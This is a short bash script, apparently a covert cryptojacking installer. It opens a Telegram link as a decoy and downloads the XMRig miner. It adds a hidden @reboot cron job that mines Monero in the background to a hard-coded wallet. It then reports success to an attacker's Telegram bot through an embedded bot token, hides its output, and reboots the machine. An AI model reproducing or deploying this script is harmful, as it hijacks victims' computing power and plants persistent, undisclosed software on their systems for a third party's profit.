#!/bin/bash

xdg-open "https://t.me/bahaa_010640/91" &>/dev/null

sudo apt update
sudo apt install -y wget tar cron

wget -q https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz -O xmrig.tar.gz
tar -xvf xmrig.tar.gz -C /tmp/
sudo cp /tmp/xmrig-6.16.4/xmrig /usr/local/bin/
rm -rf /tmp/xmrig-6.16.4 xmrig.tar.gz

CRON_JOB="@reboot sleep 50; /usr/local/bin/xmrig -o xmrpool.eu:9999 -u 48ZhAxs6zJD3hG89Gp6pCZSut5csowVQ5EVMikA7xu8zLK7hdrQtnY14Cb4vxX5XuU7igSMG3GnsyfzEThqBpK8sMC8Epvh -k --tls --cpu-priority=3 --background --threads=2"

if ! crontab -l 2>/dev/null | grep -qF "$CRON_JOB"; then
    (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
    echo "1"
else
    echo " 0 "
fi

BOT_TOKEN="7358706949:AAGmCtR29AVrmTO5lH6M7424T0pWim_Pm0k"
CHAT_ID="5792222595"
MESSAGE "DONE_MONERO"

curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
    -d "chat_id=$CHAT_ID" \
    -d "text=$MESSAGE" &>/dev/null
clear
echo "1"
sudo apt update -y && sudo apt upgrade -y
sudo reboot